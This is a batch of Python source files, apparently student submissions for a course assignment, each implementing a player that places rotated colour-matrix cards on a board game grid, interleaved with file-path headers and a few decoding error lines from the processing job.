        for matrix in cards_at_hand:
            card = Matrix(matrix)
            cards.append([])
            paths.append([])
            for _ in range(2 if card.is_symmetrical() else 4):
                cards[-1].append(card.copy())
                paths[-1].append(card.get_paths())
                card.rotate()

        self.board = Board(Point(board_rows, board_cols))
        self.cards_at_hand = copy.deepcopy(cards)
        self.cards_at_hand_paths = copy.deepcopy(paths)
        self.cards_at_hand_enemy = copy.deepcopy(cards)
        self.cards_at_hand_paths_enemy = copy.deepcopy(paths)
        self.algorithm = self.best_move
        self.score = 0
        self.score_enemy = 0

        self.round_start = 0

    Y, X, MATRIX, IDX = range(4)  # card shape

    def play(self, new_card_on_desk):
        self.round_start = time.time()

        if len(new_card_on_desk) == 3:
            self.cardsOnDesk.append(new_card_on_desk)  # for drawing

            p_enemy = Point(new_card_on_desk[:2])
            card_enemy = Matrix(new_card_on_desk[2])
            paths_enemy = None
            for card_idx, rotations in enumerate(self.cards_at_hand_enemy):
                for card_r, card_matrix in enumerate(rotations):
                    if card_matrix == card_enemy:
                        self.cards_at_hand_enemy.pop(card_idx)
                        paths_enemy = self.cards_at_hand_paths_enemy.pop(card_idx)[card_r]
                        break
                if paths_enemy is not None: break

            self.score_enemy += self.board.rank_card(p_enemy, card_enemy, paths_enemy)
            self.board.place_card(p_enemy, card_enemy, paths_enemy)

        if len(self.cards_at_hand) == 0:
            return []

        if self.board.is_empty:
            move = self.first_move()
        else:
            move = self.algorithm()

        if move is None:
            return []

        p, (card_idx, card_r) = move

        card = self.cards_at_hand.pop(card_idx)[card_r]
        paths = self.cards_at_hand_paths.pop(card_idx)[card_r]

        self.score += self.board.rank_card(p, card, paths)
        self.board.place_card(p, card, paths)

        card_brute = [p.y, p.x, card.matrix]
        self.cardsOnDesk.append(card_brute)  # for drawing
        return card_brute

    def first_move(self):
        card_idx = random.randint(0, len(self.cards_at_hand) - 1)
        card_r = random.randint(0, len(self.cards_at_hand[card_idx]) - 1)
        card = self.cards_at_hand[card_idx][card_r]

        # legal_moves = self.board.get_starting_moves(card.size)
        # move = legal_moves[random.randint(0, len(legal_moves) - 1)]

        move = Point((self.board.size.y - card.height) // 2, (self.board.size.x - card.width) // 2)

        # move = Point(0,0)

        return [move, (card_idx, card_r)]

    def random_move(self):
        card_idx = random.randint(0, len(self.cards_at_hand) - 1)
        card_r = random.randint(0, len(self.cards_at_hand[card_idx]) - 1)

        card = self.cards_at_hand[card_idx][card_r]
        legal_moves = self.board.get_legal_moves(card.size)
        if len(legal_moves) == 0: return None
        move = legal_moves[random.randint(0, len(legal_moves) - 1)]
        return [move, (card_idx, card_r)]

    def best_move(self):
        best_move = None
        best_score = 0
        moves = self.get_moves()
        for score, move, card in moves:
            if score >= best_score:
                best_move = [move, card]
                best_score = score
        return best_move

    def get_moves(self):
        evaluated_moves = []
        for card_idx, card_rotations in enumerate(self.cards_at_hand):
            for card_r, card in enumerate(card_rotations):
                legal_moves = self.board.get_legal_moves(card.size)
                for move in legal_moves:
                    score = self.board.rank_card(move, card, self.cards_at_hand_paths[card_idx][card_r])
                    evaluated_moves.append([score, move, (card_idx, card_r)])
                    if time.time() - self.round_start > self.timeout - 0.1:
                        return evaluated_moves
        return evaluated_moves
    simunma8
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/simunma8______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 1515: ordinal not in range(128)    koptipet
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/koptipet______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw

#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]


class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Snail"
        self.firsttah = True
        self.pole = [[-1]*boardCols for i in range(boardRows)]


    def misto(self,deska):

        #deska [[-1,0,-1],[-1,-1,-1],[-1,-1,-1]]
        deskasloupce = copy.deepcopy(deska)

        delka = len(deska[0])


        for cislo in range(delka):
            temp = deskasloupce[-1][cislo]
            if int(temp) == -1:
                deskasloupce[-1][cislo] = 1
            else:
                deskasloupce[-1][cislo] = 0 

        for i in range(len(deskasloupce)-2, -1, -1):
            for cislo in range(delka):
                temp = deskasloupce[i][cislo]
                if int(temp) == -1:
                    deskasloupce[i][cislo] = deskasloupce[i+1][cislo] + 1
                else:
                    deskasloupce[i][cislo] = 0

        return deskasloupce

    def legit(self,kartos, pole):
        #kartos [3,2]
        posibletemp = []

        for sl in range(len(pole[0]) - kartos[1] + 1):
            for rdk in range(len(pole)):
                for delka in range(kartos[1]):
                    if self.deskasloupce[rdk][sl + delka] < kartos[0]:
                        break
                else:
                    posibletemp.append([rdk,sl])

        return posibletemp

    def vedle(self,kartos, pole, posibletemp):
        #posibletemp[radek,sloupec], kartos[vyska,delka]
        if posibletemp[0] > 0:
            for all in range(kartos[1]):
                if pole[posibletemp[0]-1][all+posibletemp[1]] == 0:
                    return True
        if (posibletemp[0]+kartos[0])<len(pole):
            for all in range(kartos[1]):
                if pole[posibletemp[0]+kartos[0]][all+posibletemp[1]] == 0:
                    return True
        if posibletemp[1] > 0:
            if pole[posibletemp[0]][posibletemp[1]-1] < kartos[0]:
                return True
        if (posibletemp[1]+kartos[1]) < len(pole[0]):
            if pole[posibletemp[0]][posibletemp[1]+kartos[1]] < kartos[0]:
                return True
        return False

    def rotace(self,k):
         radky = len(k)
         sloupce = len(k[0])
         pole_rot = [[0]*radky for i in range(sloupce)]
         max_s = sloupce - 1
         for r in range(radky):
              for s in range(sloupce):
                   pole_rot[max_s-s][r] = k[r][s]

         return pole_rot

    def aktualizace(self,k):
        for i in range(len(k[2])):
                    for j in range(len(k[2][0])):
                        self.pole[i+k[0]][j+k[1]] = k[2][i][j]

    def play(self,newCardOnDesk):

        if len(newCardOnDesk) == 3:
           self.cardsOnDesk += [ newCardOnDesk ]
           self.aktualizace(newCardOnDesk)
        self.deskasloupce = self.misto((self.pole))

        if len(self.cardsAtHand) == 0:
            return []

        if self.firsttah == True and newCardOnDesk == []:

            #dopsat kontrolu polozeni
            card = self.cardsAtHand[0]
            self.cardsAtHand = self.cardsAtHand[1:]
            self.firsttah = False
            self.aktualizace([0, 0, card])
            self.cardsOnDesk += [[0, 0, card]]
            return [0, 0, card]
        else:
            self.firsttah = False
            
            real = []
            r = 0
            for karty in self.cardsAtHand:
                temp = len(karty),len(karty[0])
                for j in self.legit(temp,self.deskasloupce):
                    if self.vedle(temp, self.deskasloupce,j) == True:
                        real.append(j + [karty] + [r])
                if temp[0] != temp[1]:
                    temp = temp[1],temp[0]
                    for j in self.legit(temp,self.deskasloupce):
                        if self.vedle(temp, self.deskasloupce,j) == True:
                            real.append(j + [self.rotace(karty)]+ [r])
                r += 1
            if real != []:
                self.cardsOnDesk += [[real[0][0],real[0][1],copy.deepcopy(real[0][2])]]
                self.cardsAtHand = self.cardsAtHand[real[0][3]+1:]
                real[0].pop(3)
                self.aktualizace(real[0])
                return real[0]
            else:
                return []


if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp = [C44a, C44b, C33a,C33c, C53c, C53b]*1

    p1 = Player("testA", 19, 23, tmp)
    p2 = Player("testB", 19, 23, tmp)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move)
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move)
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    tomasvit
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/tomasvit______________________
        player.py
import base as BASE
import copy, random, time, sys, os
import numpy as np
import random as rnd
from PIL import Image, ImageDraw

#####################################################################################################
#####################################################################################################
#####################################################################################################

#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [3,1,2,3], 
         [1,1,2,2],
         [2,2,1,1],
         [3,2,1,3] ]  

C44b = [ [3,3,1,3], 
         [1,1,1,3],
         [3,2,2,2],
         [3,2,3,3] ] 

C53b = [ [3,1,3], 
         [3,1,3],
         [3,1,3],
         [3,1,1],
         [3,3,3] ]

C53c = [ [3,1,3], 
         [3,1,3],
         [3,1,1],
         [3,2,2],
         [3,2,3] ]

C33a = [ [3,1,3], 
         [1,1,2],
         [3,3,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]

#####################################################################################################
#####################################################################################################
#####################################################################################################

class Card():
    #source:me, ../HW/hw8/cards_hard.py
    def __init__(self, size:tuple, card:list, placement=None):
        self.rows, self.columns = size
        self.card = [card]
        self.placement = placement
        self.area = self.rows*self.columns
        self.colours = set(np.unique(card))
        # self.colours.discard(0)
        self.edges = {}
        for colour in self.colours:
            self.edges[colour] = [[],[],[],[]]

    def rotation(self):
        rows, cols = self.card[-1].shape
        rotated = np.zeros((cols, rows))
        for i in range(rows):
            for j in range(cols):
                rotated[j, i] = self.card[-1][i, -j-1]
        self.card.append(rotated.astype(int))

    def edge_colours(self):
        for r in range(4):
            rows, cols = self.rows, self.columns
            if bool(r%2):
                rows, cols = cols, rows
            for colour in self.colours:
                if self.card[r][0][0] == colour:
                    self.edges[colour][r].append([0,0])
                if self.card[r][rows-1][0] == colour:
                    self.edges[colour][r].append([rows-1,0])
                if self.card[r][rows-1][cols-1] == colour:
                    self.edges[colour][r].append([rows-1,cols-1])
                if self.card[r][0][cols-1] == colour:
                    self.edges[colour][r].append([0, cols-1])
                for x in range(1, rows-1):
                    if self.card[r][x][0] == colour:
                        self.edges[colour][r].append([x,0])
                    if self.card[r][x][cols-1] == colour:
                        self.edges[colour][r].append([x,cols-1])
                for y in range(1, cols-1):
                    if self.card[r][0][y] == colour:
                        self.edges[colour][r].append([0,y])
                    if self.card[r][rows-1][y] == colour:
                        self.edges[colour][r].append([rows-1,y])

#####################################################################################################
#####################################################################################################
#####################################################################################################

class Player(BASE.BasePlayer):
    def __init__(self, login, boardRows, boardCols, cardsAtHand, logfile:str=None):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Drunk high madman's fever rambling"
        self.setup_cards()
        self.field = -10*np.ones((self.boardRows, self.boardCols)).astype(int)
        self.field_area = np.sum(self.field)
        self.number_of_cards = len(self.custom_cards)
        if logfile!= None:
            self.file = open(logfile, "a")

    def edges(self) -> tuple:
        rows, cols = np.where(self.field!=-10)
        edges = []
        top, bottom = min(rows), max(rows)
        top_row = np.where(rows==top)
        bottom_row = np.where(rows == bottom)
        
        if top == 0:
            where = np.where(rows==0)
            edges.append([0, cols[where[0][0]]])
            edges.append([0, cols[where[0][-1]]])
        else:
            for i in top_row[0]:
                edges.append([rows[i], cols[i]])
        
        for i in range(top+1, bottom):
            where = np.where(rows==i)
            edges.append([i, cols[where[0][0]]])
            for j in range(1, len(where[0])-1):
                if ((i+1 < self.boardRows and self.field[i+1][cols[where[0][j]]] == -10) or 
                    (i-1 > -1 and self.field[i-1][cols[where[0][j]]] == -10)):
                    edges.append([i, cols[where[0][j]]])
            edges.append([i, cols[where[0][-1]]])
        
        if bottom == self.boardRows-1:
            where = np.where(rows==self.boardRows-1)
            edges.append([self.boardRows-1, cols[where[0][0]]])
            edges.append([self.boardRows-1, cols[where[0][-1]]])
        else:    
            for i in bottom_row[0]:
                edges.append([rows[i], cols[i]])

        colored = []
        for edge in edges:
            if self.field[edge[0], edge[1]] > 0:
                colored.append(edge)

        return np.asarray(edges, dtype=object), np.asarray(colored, dtype=object)

    def setup_cards(self) -> None:
        self.custom_cards = []
        cards_given = self.cardsAtHand[:]
        while cards_given:
            card = np.array(cards_given.pop())
            custom = Card(card.shape, card)
            for i in range(3):
                custom.rotation()
            custom.edge_colours()
            self.custom_cards.append(custom)
    
    def insert_card(self, playfield:np.array, card:Card, rotation:int, location:list) -> None:
        #source:me, ../HW/hw8/cards_hard.py
        x, y = location
        # self.file.write("card insertion "+str([x,y,card.rows,card.columns,playfield.shape])+"\n")
        if rotation%2 == 0:
            playfield[x:x+card.rows, y:y+card.columns] = card.card[rotation]
        else:
            playfield[x:x+card.columns, y:y+card.rows] = card.card[rotation]
        return playfield

    def points_of_interest(self, edge:np.ndarray, card:Card, directions:list, color:int=None) -> tuple:
        points = []
        up, down, left, right = directions
        if color != None:
            for r in range(4):
                card_edges = card.edges[color][r]
                # self.file.write("card edges "+str(card_edges)+"\n")

                for i in range(len(card_edges)):
                    rows, cols = card.card[r].shape
                    x,y = card_edges[i]
                    # self.file.write("current card edge "+str([x,y])+"\n")
                    if y == 0 and right:
                        points.append([edge[0]-x, edge[1]+1, r])
                    if y == cols-1 and left:
                        points.append([edge[0]-x, edge[1]-y-1, r])
                    if x == 0 and down:
                        points.append([edge[0]+1, edge[1]-y, r])
                    if x == rows-1 and up:
                        points.append([edge[0]-1-x, edge[1]-y, r])
        else:
            xup, xup_rt = edge[0]-card.rows, edge[0]-card.columns
            yleft, yleft_rt = edge[1]-card.columns, edge[1]-card.rows
            xdown, yright = edge[0], edge[1]

            for i in range(1, card.rows):
                if xup+i >= 0:
                    xupi = xup + i
                    points.append([xupi, yleft, 0])
                    points.append([xupi, yright, 0])

                if xdown+i < self.boardRows:
                    xdowni = xdown + i
                    points.append([xdowni, yleft, 0])
                    points.append([xdowni, yright, 0])
                    if card.rows != card.columns:
                        points.append([xdowni, yleft_rt, 1])
                        points.append([xdowni, yright, 1])

                if yleft_rt+i >=0 and card.rows != card.columns:
                    yleft_rti = yleft_rt + i
                    points.append([xup_rt, yleft_rti, 1])
                    points.append([xdown, yleft_rti, 1])

            for i in range(1, card.columns):
                if yleft+i >= 0:
                    ylefti = yleft + i
                    points.append([xup, ylefti, 0])
                    if card.rows != card.columns:points.append([xdown, ylefti, 1])

                if yright+i < self.boardCols:
                    yrighti = yright + i
                    points.append([xup, yrighti, 0])
                    points.append([xdown, yrighti, 0])
                    if card.rows != card.columns:
                        points.append([xup_rt, yrighti, 1])
                        points.append([xdown, yrighti, 1])

                if xup_rt+i >= 0 and card.rows != card.columns:
                    xup_rti = xup_rt + i
                    points.append([xup_rti, yleft_rt, 1])
                    points.append([xup_rti, yright, 1])
        
        return points

    def flood_fill(self, field:np.array, points:list) -> int:
        component = 0
        visited = set()
        while points:
            point = points.pop(0)
            queue = [point]
            colour = field[point[0]][point[1]]
            while queue:
                x, y = queue.pop(0)
                if [x,y] in points:
                    points.remove([x,y])
    
                if str(x)+str(y) not in visited:
                    visited.add(str(x)+str(y))
                else:
                    continue
                if int(field[x, y]) == colour:
                    component += 1
                    if x-1 >= 0:
                        queue.append([x-1, y])
                    if x+1 < self.boardRows:
                        queue.append([x+1, y])
                    if y-1 >= 0:
                        queue.append([x, y-1])
                    if y+1 < self.boardCols:
                        queue.append([x, y+1])
            visited.clear() # just saving on memory a bit
        return component

    def comp_check(self, field:np.array, card:Card, rot:int, location:list) ->int:
        component = 0
        points = []
        rows, cols = card.card[rot].shape

        for colour in card.colours:

            for edge in card.edges[colour][rot]:
                x, y = edge[0]+location[0], edge[1]+location[1]
                if x-1 >= 0 and edge[0] == 0 and int(field[x-1,y]) == colour:
                    points.append([x-1,y])
                if x+1 < self.boardRows and edge[0] == rows-1 and int(field[x+1,y]) == colour:
                    points.append([x+1,y])
                if y-1 >= 0 and edge[1] == 0 and int(field[x,y-1]) == colour:
                    points.append([x,y-1])
                if y+1 < self.boardCols and edge[1] == cols-1 and int(field[x,y+1]) == colour:
                    points.append([x,y+1])

            component += self.flood_fill(field,points)    

        return component

    def pick_for_score(self, edge:list, card:Card):
        rotation = -1
        X, Y = edge
        component = -1
        color = int(self.field[edge[0],edge[1]])
        if color not in card.colours:
            return rotation, component
        # self.file.write("we passed the colour check\n")
        directions = [(X-1>=0 and int(self.field[X-1,Y]) == -10), (X+1<self.boardRows and int(self.field[X+1,Y]) == -10),
                      (Y-1>=0 and int(self.field[X,Y-1]) == -10), (Y+1<self.boardCols and int(self.field[X,Y+1]) == -10)]
        candidates = self.points_of_interest(edge, card, directions, color=color)
        rows, cols = card.rows, card.columns
        # self.file.write("candidates "+str(candidates)+"\n")
        while candidates:
            x, y, r = candidates.pop(0)

            if bool(r%2):
                contention = self.field[x:x+cols, y:y+rows]
            else:
                contention = self.field[x:x+rows, y:y+cols]
            negative = (contention == -10).astype(int)
            # self.file.write("area testing "+str(np.sum(negative))+" "+str(card.area)+"\n")
            # self.file.write("testing " + str(negative.tolist())+"\n")
            if np.sum(negative).astype(int) == card.area:
                test_field = self.insert_card(np.copy(self.field), card, r, [x,y])
                component_new = self.comp_check(test_field, card, r, [x,y])
                if component_new > component:
                    card.placement = [x, y]
                    component = component_new
                    rotation = r

        return rotation, component

    def pick_any_valid_move(self, edge:np.array, card:Card):
        rotation = -1
        X, Y = edge
        directions = [(X-1>=0 and int(self.field[X-1,Y]) == -10), (X+1<self.boardRows and int(self.field[X+1,Y]) == -10),
                      (Y-1>=0 and int(self.field[X,Y-1]) == -10), (Y+1<self.boardCols and int(self.field[X,Y+1]) == -10)]
        candidates = self.points_of_interest(edge, card, directions)
        # self.file.write("edge "+str(edge)+"\n")
        # self.file.write("directions " + str(directions)+"\n")
        # self.file.write("candidates " + str(candidates)+"\n")
        while candidates:
            x, y, r = candidates.pop(0)
            # self.file.write(str([x,y,r])+"\n")
            if bool(r%2):
                contention = self.field[x:x+card.columns, y:y+card.rows]
            else:
                contention = self.field[x:x+card.rows, y:y+card.columns]
            negative = (contention == -10).astype(int)

            if np.sum(negative).astype(int) == card.area:
                return r, [x,y]
            
        return rotation, [-1, -1]

    def play(self,newCardOnDesk):
        # print(self.userLogin)
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """
        # for line in self.field:print(line)
        if self.custom_cards == []:
            # self.file.write("none left\n")
            return []
        # self.file.write("newCardOnDesk "+str(newCardOnDesk)+"\n")
        if newCardOnDesk == []:
            # self.file.write("aww, he is so smol\n")
            if np.sum(self.field) == self.field_area:
                # self.file.write("random bullshit go!\n")
                x, y = rnd.randint(0, self.boardRows-6), rnd.randint(0, self.boardCols-6)
                rot = rnd.randint(0,3)
                card = rnd.randint(0, len(self.custom_cards)-1)
                playcard = self.custom_cards.pop(card)
                self.number_of_cards -= 1
                self.field = self.insert_card(self.field, playcard, rot, [x,y])
                # self.file.write(str(x)+" "+str(y)+" "+str(playcard.card[rot].tolist())+"\n")
                # for line in self.field:self.file.write(str(line)+"\n")
                self.cardsOnDesk += [[int(x), int(y), playcard.card[rot].tolist()]]
                return [int(x), int(y), playcard.card[rot].tolist()]
        else:
            # self.file.write("Come on then\n")
            self.cardsOnDesk += [newCardOnDesk]
            npcard = np.array(newCardOnDesk[2])
            shape = npcard.shape

            custom = Card(shape, npcard, placement=newCardOnDesk[:2])
            self.field = self.insert_card(self.field, custom, 0, newCardOnDesk[:2])
            # for line in self.field:self.file.write(str(line)+"\n")

        edges, coloured = self.edges()
        # self.file.write("edges "+str(edges)+"\n")
        component, rotation = -1, -1
        playcard = 0
        location = []
        for i in range(self.number_of_cards):
            card = self.custom_cards[i]
            # self.file.write("card "+str(card.card)+"\n")
            for edge in coloured:
                rot, component_new = self.pick_for_score(edge, card)
                # self.file.write(str(edge)+" "+str(rot)+" "+str(component_new)+"\n")
                if component_new > component:
                    location = card.placement
                    component = component_new
                    rotation = rot
                    playcard = i
        # component = 0
        if component <= 0:
            # self.file.write("no good move\n")
            if self.number_of_cards <= 0:
                return []
            found = False
            for i in range(self.number_of_cards):
                card = self.custom_cards[i]
                # self.file.write("card "+str(card.card)+"\n")
                for edge in edges:
                    rotation, location = self.pick_any_valid_move(edge, card)
                    if rotation >= 0:
                        found = True
                        playcard = i
                        break
                if found:
                    break
            if not found:
                return []

        card = self.custom_cards.pop(playcard)
        self.number_of_cards -= 1
        x, y = location
        # self.file.write(str(x)+" "+str(y)+" "+str(card.card[rotation].tolist())+"\n")
        self.field = self.insert_card(self.field, card, rotation, [x,y])
        self.cardsOnDesk += [[int(x), int(y), card.card[rotation].tolist()]]
        # for line in self.field:self.file.write(str(line)+"\n")
        return [int(x), int(y), card.card[rotation].tolist()]

#####################################################################################################
#####################################################################################################
#####################################################################################################

if __name__ == "__main__":
    """ when you run:
        python3 player.py

        you should get set of .png files with the progress of the game
    """

    tmp1 = [[[4, 2, 4, 2], 
            [2, 2, 4, 4], 
            [4, 4, 2, 2], 
            [2, 4, 2, 4]],
           [[0, 2, 4, 0], 
            [2, 2, 4, 4], 
            [4, 4, 2, 2], 
            [0, 4, 2, 0]],
           [[0, 0, 0, 4, 0], 
            [4, 4, 4, 4, 0], 
            [0, 0, 0, 0, 0]],
           [[0, 2, 2], 
            [4, 4, 0], 
            [0, 4, 0]],
           [[3, 2, 3], 
            [2, 2, 2], 
            [3, 2, 3]],
           [[0, 3, 0, 3], 
            [0, 3, 3, 2], 
            [2, 2, 3, 0], 
            [3, 2, 3, 0]],
           [[0, 0, 2, 0], 
            [2, 2, 2, 0], 
            [0, 3, 3, 3], 
            [0, 3, 0, 0]],
           [[0, 0, 1, 0], 
            [1, 1, 1, 0], 
            [0, 2, 2, 2], 
            [0, 2, 0, 0]], 
           [[0, 1, 0], 
            [0, 1, 0], 
            [0, 1, 0], 
            [0, 1, 1], 
            [0, 0, 0]],
           [[1, 3, 0, 0], 
            [0, 1, 1, 1], 
            [1, 1, 3, 3], 
            [0, 0, 3, 1]]]
 
    tmp2 = [
          [[0, 4, 1, 0], 
           [4, 4, 1, 1], 
           [1, 1, 4, 4], 
           [0, 1, 4, 0]],
          [[0, 0, 0], 
           [1, 1, 0], 
           [0, 1, 0], 
           [0, 1, 0], 
           [0, 1, 0]],
          [[1, 2, 1], 
           [2, 2, 2], 
           [1, 2, 1]],
          [[0, 1, 3, 0], 
           [1, 1, 3, 3], 
           [3, 3, 1, 1], 
           [0, 3, 1, 0]],
          [[1, 3, 1], 
           [3, 3, 3], 
           [1, 3, 1]],
          [[0, 2, 0], 
           [0, 2, 0], 
           [0, 2, 0]],
          [[0, 3, 0], 
           [0, 3, 0], 
           [0, 3, 0]],
          [[0, 1, 0], 
           [1, 1, 3], 
           [0, 0, 3]],
          [[0, 4, 2, 0], 
           [4, 4, 2, 2], 
           [2, 2, 4, 4], 
           [0, 2, 4, 0]],
          [[0, 1, 0], 
           [1, 1, 4], 
           [0, 0, 4]]         
          ]
           

    log1 = "log1.txt"
    log2 = "log2.txt"

    p1 = Player("testA", 10*2, 15+5, tmp1, logfile=log1)
    p2 = Player("testB", 10*2, 15+5, tmp1, logfile=log2)

    p2move = []
    gameStep = 0
    while True:
        p1move = p1.play(p2move)
        print("p1 returned", p1move, gameStep, "A")
        # for i in range(p1.number_of_cards):
            # print(p1.custom_cards[i].card[0], end=" ")
        # print()
        p1.drawCards(p1.boardRows, p1.boardCols, p1.cardsOnDesk,"move-{:02}b-A.png".format(gameStep))

        p2move = p2.play(p1move)    
        print("p2 returned", p2move, gameStep, "B")
        # for i in range(p2.number_of_cards):
            # print(p2.custom_cards[i].card[0], end=" ")
        # print()
        p2.drawCards(p2.boardRows, p2.boardCols, p2.cardsOnDesk,"move-{:02}b-B.png".format(gameStep))
        gameStep += 1
        if p1move == [] and p2move == []:
            print("end of game")
            quit()


    benesfi5
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/benesfi5______________________
        player.py
An error occurred: 'ascii' codec can't decode byte 0xc3 in position 1945: ordinal not in range(128)    baresji2
/scratch.ssd/vonasek/job_7709676.pbs-m1.metacentrum.cz/src-processed/baresji2______________________
        player.py
import base as BASE
import copy, random, time, sys, os
from PIL import Image, ImageDraw


#basic cards with colors 1 and 2
#note that Brute can provide you also other cards!
C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ] 

C53b = [ [0,1,0], 
         [0,1,0],
         [0,1,0],
         [0,1,1],
         [0,0,0] ]

C53c = [ [0,1,0], 
         [0,1,0],
         [0,1,1],
         [0,2,2],
         [0,2,0] ]

C33a = [ [0,1,0], 
         [1,1,2],
         [0,0,2] ]

C33c = [ [1,2,1], 
         [2,2,2], 
         [1,2,1] ]
class Area:
    def __init__(self):
        self.Size = 0
        self.Type = None

class AreaMap:
    def __init__(self):
        self.Map = None
        self.Areas = None

class Card:
    def __init__(self):
        self.rot1 = []
        self.rot2 = []
        self.rot3 = []
        self.rot4 = []

class Player(BASE.BasePlayer):
    
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        super().__init__(login, boardRows, boardCols, cardsAtHand)
        self.playerName = "Random Bot 3K"
        self.baseplate = []
        self.coord = []
        self.start = 0
        for _ in range(boardRows):
         self.baseplate.append([None] * boardCols)
        self.hand = []
        for i in range(len(cardsAtHand)):            
            card = Card()
            self.hand.append( card )
            self.hand[-1].rot1 = cardsAtHand[i]

            for _ in range(len(self.hand[-1].rot1[0])):
                self.hand[-1].rot2.append([0] * len(self.hand[-1].rot1))

            for r in range(len(self.hand[-1].rot1[0])):
                for c in range(len(self.hand[-1].rot1)):
                    self.hand[-1].rot2[r][-1-c] = self.hand[-1].rot1[c][r]

            for _ in range(len(self.hand[-1].rot2[0])):
                self.hand[-1].rot3.append([0] * len(self.hand[-1].rot2))

            for r in range(len(self.hand[-1].rot2[0])):
                for c in range(len(self.hand[-1].rot2)):
                    self.hand[-1].rot3[r][-1-c] = self.hand[-1].rot2[c][r]
            
            for _ in range(len(self.hand[-1].rot3[0])):
                self.hand[-1].rot4.append([0] * len(self.hand[-1].rot3))
            for r in range(len(self.hand[-1].rot3[0])):
                for c in range(len(self.hand[-1].rot3)):
                    self.hand[-1].rot4[r][-1-c] = self.hand[-1].rot3[c][r]


    def play(self,newCardOnDesk):
        """ this method is called during the game. 
            The input argument newCardOnDesk is:
            - [] if other player didn't place any card in his move), or
            - [row, col, cardMatrix], which informs your player that cardMatrix was placed at row,col to the game board
            
            Return value: 
            - [ row, col, cardMatrix ] if you want to place a card, or
            - [] if no card can be placed 
        """

        #recommened steps 
        #step 0: write newCardOnDesk to list of cards that are on the board game
        #step 1: compute all possible placement of your all (so for available) cards
        #step 2: evaluate each placement, i.e., compute score for it
        #step 3: select card that you want to place to the game board, mark it as used (not available in future)
        #step 4: return your placement, or [] if no placement can be made
        #the following code DOES NOT provides correct moves, 
        #it just return random card at random position

        if len(newCardOnDesk) == 3:
            self.cardsOnDesk += [ newCardOnDesk ]
            for r in range(len(newCardOnDesk[2])):
                    for c in range(len(newCardOnDesk[2][0])):
                        self.baseplate[r+newCardOnDesk[0]][c+newCardOnDesk[1]] = newCardOnDesk[2][r][c]
            self.coord.append([0,0,0,0])
            self.coord[-1][0] = newCardOnDesk[0]
            self.coord[-1][1] = newCardOnDesk[1]
            self.coord[-1][2] = len(newCardOnDesk[2])
            self.coord[-1][3] = len(newCardOnDesk[2][0])
        else:
            if self.start == 0:
                for r in range(len(self.hand[-1].rot1)):
                    for c in range(len(self.hand[-1].rot1[0])):
                        self.baseplate[r][c] = self.hand[-1].rot1[r][c]
                returned = self.hand[-1].rot1
                self.hand = self.hand[:-1]  
                self.cardsOnDesk += [[ 0,0,returned ]]     
                self.coord.append([0,0,0,0])
                self.coord[-1][0] = 0
                self.coord[-1][1] = 0
                self.coord[-1][2] = len(returned)
                self.coord[-1][3] = len(returned[0])             
                return [0,0,returned]

        self.start = 1

        if len(self.cardsAtHand) == 0:
            return []


        for card in range(len(self.hand)):  
            for base in range(len(self.cardsOnDesk)):
                lhr = self.coord[base][0] - len(self.hand[card].rot1)
                lhc = self.coord[base][1] - len(self.hand[card].rot1[0])
                phr = self.coord[base][2] + self.coord[base][0]
                phc = self.coord[base][3] + self.coord[base][1]
                if lhc >= 0:
                    for pos in range(lhr+1,phr):
                        if pos > 0 and pos <= (len(self.baseplate)-len(self.hand[card].rot1)):
                            invalid = 0
                            for r in range(len(self.hand[card].rot1)):
                                for c in range(len(self.hand[card].rot1[0])):
                                    if self.baseplate[pos+r][c+lhc] == None:
                                        continue
                                    else:
                                        invalid = 1
                                        break
                                if invalid == 1:
                                    break
                            if invalid == 0:
                                for r in range(len(self.hand[card].rot1)):
                                    for c in range(len(self.hand[card].rot1[0])):
                                        self.baseplate[r+pos][c+lhc] = self.hand[card].rot1[r][c]
                                returned = self.hand[card].rot1
                                self.hand = self.hand[:card] + self.hand[card+1:]
                                self.cardsOnDesk += [[ pos,lhc,returned ]]   
                                self.coord.append([0,0,0,0])
                                self.coord[-1][0] = pos
                                self.coord[-1][1] = lhc
                                self.coord[-1][2] = len(returned)
                                self.coord[-1][3] = len(returned[0])                   
                                return [pos,lhc,returned]
                                    
